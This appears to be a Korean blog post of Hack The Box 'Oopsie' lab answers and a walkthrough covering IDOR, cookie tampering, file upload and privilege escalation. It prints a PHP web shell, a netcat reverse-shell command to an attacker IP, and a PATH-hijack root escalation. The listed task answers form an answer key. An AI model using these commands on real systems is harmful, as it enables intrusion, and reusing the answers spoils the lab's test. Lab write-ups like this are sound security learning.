---
title: Starting Point - Oopsie
date: 2026-03-13 17:40:49 +0900
categories: [Labs, HTB]
---

## Task 1.
proxy

## Task 2.
/cdn-cgi/login

## Task 3.
cookie

## Task 4.
34322

## Task 5.
/uploads

## Task 6.
db.php

## Task 7.
find

## Task 8.
root

## Task 9.
Set owner User ID

## Task 10.
cat

## 분석 및 플래그 획득

nmap을 써보니 http 서버가 열려있는걸 확인했고 브라우저로 접속해보면 사이트가 뜬다.

개발자 도구로 확인해보니 cdn-cgi/login 을 확인할 수 있다.

해당 경로로 이동하면 로그인 페이지가 뜬다.

간단한 sqli를 해보니까 안되는 것 같고, 게스트로 접속해보자.

게스트로 접속해서 분석해보니 다음과 같은 정보를 알 수 있었다.

![](/assets/img/2026/htb-oopsie/1.png)
![](/assets/img/2026/htb-oopsie/2.png)

url의 id 값을 통해 정보를 조회하고 쿠키에 정보들을 저장해둔다. id 값을 조작하니 admin의 Acess id를 얻을 수 있었다.

![](/assets/img/2026/htb-oopsie/3.png)

이걸로 쿠키를 조작해서 관리자만 접근할 수 있는 페이지로 이동해보자.

uploads 페이지에 가보면 파일을 올리는 것이 가능하다.

웹쉘이 되는지 확인하기 위해서 간단한 php 파일을 만들고, 업로드해보았다.

이걸 웹에서 접근하기 위해서는 어디에 업로드한 파일을 저장해두는지 알아야하는데, 이건 gobuster를 사용해서 알아냈다.

![](/assets/img/2026/htb-oopsie/4.png)

확인해본 결과 php 파일이 실행이 되는 것을 확인했다. 이제 웹 쉘을 업로드에서 플래그를 찾아보자.

<?php system($_GET['cmd'])?> 

이걸로 리버스 쉘 열려고 했는데 nc 가 안되는걸 확인했다.

http://10.129.22.153/uploads/shell.php?cmd=/bin/nc%20-e%20/bin/bash%2010.10.14.61%208000

작동안한다.. 그래서 그냥 인터넷에서 php 리버스 쉘 검색해서 제일 위에 있던걸 업로드해서 해봤다.

IP랑 포트를 바꿔주고 업로드 한 후, 실행하기 전에 로컬에서 nc로 리스닝을 해주자.

그리고 접속하면 리버스쉘이 연결된다.

![](/assets/img/2026/htb-oopsie/5.png)

유저 플래그를 획득하였다.

![](/assets/img/2026/htb-oopsie/6.png)

robert 사용자의 비밀번호를 알아낼 수 있었다.

![](/assets/img/2026/htb-oopsie/7.png)

bugtracker에 setuid 비트가 붙어있다. 그렇기 때문에 이 프로그램이 실행될 때에는 루트 권한으로 실행된다.

![](/assets/img/2026/htb-oopsie/8.png)

0을 넣었는데 저렇게 출력되는 것을 보니까 system("cat /root/reports/{id}") 형태로 실행되고 있다고 추측할 수 있다.

입력을 ../../ 형식으로 해서 루트 플래그를 획득할 수 있을 것이다.

![](/assets/img/2026/htb-oopsie/9.png)

이렇게 하고 루트 계정을 따는건 어떻게 해야할지 감이 안잡혀서 좀 찾아봤더니 PATH 환경 변수를 사용해서 얻을 수 있다는 것을 알았다.

![](/assets/img/2026/htb-oopsie/10.png)
![](/assets/img/2026/htb-oopsie/11.png)

cat 을 실행할 때 PATH 에 있는 경로들을 탐색해서 찾는데 왼쪽에 있을 수록 우선순위가 높다. 그렇기 때문에 우리가 만든 임의의 cat을 찾아서 실행해도록 한 것이다. bugtracker는 루트 권한으로 실행되기 때문에 쉘도 루트 쉘로 떨어진다.